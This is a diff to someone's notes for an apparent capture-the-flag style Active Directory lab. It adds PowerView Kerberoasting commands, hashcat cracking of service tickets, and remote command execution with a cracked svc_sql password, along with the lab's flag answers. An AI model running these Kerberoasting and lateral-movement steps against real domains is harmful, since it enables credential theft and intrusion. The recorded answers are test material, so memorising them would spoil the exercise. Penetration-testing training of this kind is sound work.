@@ -4071,7 +4071,7 @@ Apply what you learned in this module to compromise the domain and answer the qu
 # Enter in http:\\$ip\uploads
 # Enter creds
 # Run in the terminal
-c:\Users\Administrator\Desktop\flag.txt
+type c:\Users\Administrator\Desktop\flag.txt
 ```
 
 Results: JusT_g3tt1ng_st@rt3d!
@@ -4088,7 +4088,7 @@ setspn.exe -Q */*
 # MSSQLSvc/SQL01.inlanefreight.local:1433
 
 # Also you can enumerate them by uploading the PowerView.ps1 the antak Choose File and Upload the file. In that case, the command line will be used to indicate the path. After that, you need to import-module every time you are going to use the cmdlet because the command line does not maintain the state. Everything runs in the context of the command.
-cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.psm1 ; Get-DomainUser * -spn | select samaccountname
+cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainUser * -spn | select samaccountname
 ```
 
 Results:  svc_sql
@@ -4098,7 +4098,7 @@ Results:  svc_sql
 
 ```
 # Obtain the ticket
-cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.psm1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
 
 # Copy ticket to the file sqlservice in my attacker machine and crack it:
 hashcat -m 13100 sqlserver /usr/share/wordlists/rockyou.txt
@@ -4110,19 +4110,36 @@ Results: lucky7
 **Submit the contents of the flag.txt file on the Administrator desktop on MS01**
 
 ```
-# Create a SecureString object
-$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force; $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password) ; Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+# We upload the file Microsoft.ActiveDirectory.Management.dll from the Active Directory powershell module and now we can use it to enumerate computers
+Import-Module .\Microsoft.ActiveDirectory.Management.dll; Get-ADComputer -Filter * | Select-Object Name 
 
-
+# We need to concatenate commands with semi-colon. The following commands create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the remote host MS01
+$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\svc_sql", $password; Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
 ```
 
-Results:
+Results: spn$_r0ast1ng_on_@n_0p3n_f1re
 
 
 **Find cleartext credentials for another domain user. Submit the username as your answer.**
 
 ```
+# Enumerate SPNs with
+setspn.exe -Q */*
 
+# backupjob looks like a promising user. FRom the previous output we also know:
+# backupjob/veam001.inlanefreight.local
+Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN backupjob/veam001.inlanefreight.local -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+
+sqldev
+MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
+Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+
+sqlprod
+MSSQLSvc/SQL02.inlanefreight.local:1433
+Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL02.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+
+Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN krbtgt/DC01.INLANEFREIGHT.LOCAL -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+	
 ```
 
 Results:
